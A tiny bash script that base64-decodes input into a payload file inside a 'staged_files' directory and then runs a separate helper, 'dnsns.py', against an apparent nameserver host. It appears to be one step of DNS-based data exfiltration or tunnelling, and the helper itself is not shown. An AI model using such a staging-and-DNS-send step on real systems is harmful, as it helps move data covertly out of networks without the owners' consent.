#!/bin/bash

read -r cmd
cd staged_files
echo "$cmd"|base64 -d>payload.txt
python3 dnsns.py dnshost dnshost.nameserver